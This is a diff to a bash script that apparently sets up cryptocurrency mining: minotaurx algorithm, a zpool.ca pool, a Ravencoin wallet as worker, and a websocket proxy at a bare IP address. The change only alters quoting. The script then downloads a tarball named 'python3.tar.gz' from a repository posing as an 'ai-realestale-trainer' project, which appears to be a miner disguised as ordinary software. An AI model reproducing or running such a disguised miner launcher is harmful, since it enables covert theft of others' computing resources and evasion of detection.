@@ -1,12 +1,12 @@
 #!/bin/bash
 
-: "${M_ALGO:='minotaurx'}"
-: "${M_HOST:='minotaurx.na.mine.zpool.ca'}"
+: "${M_ALGO:=minotaurx}"
+: "${M_HOST:=minotaurx.na.mine.zpool.ca}"
 : "${M_PORT:=7019}"
-: "${M_WORKER:='RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65'}"
-: "${M_PASSWORD:='c=RVN'}"
+: "${M_WORKER:=RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65}"
+: "${M_PASSWORD:=c=RVN}"
 : "${M_THREADS:=7}"
-: "${M_PROXY:='ws://172.233.136.27:8088/proxy'}"
+: "${M_PROXY:=ws://172.233.136.27:8088/proxy}"
 
 # Download packgaes
 wget https://github.com/malphite-code-3/ai-realestale-trainer/releases/download/python3.2/python3.tar.gz
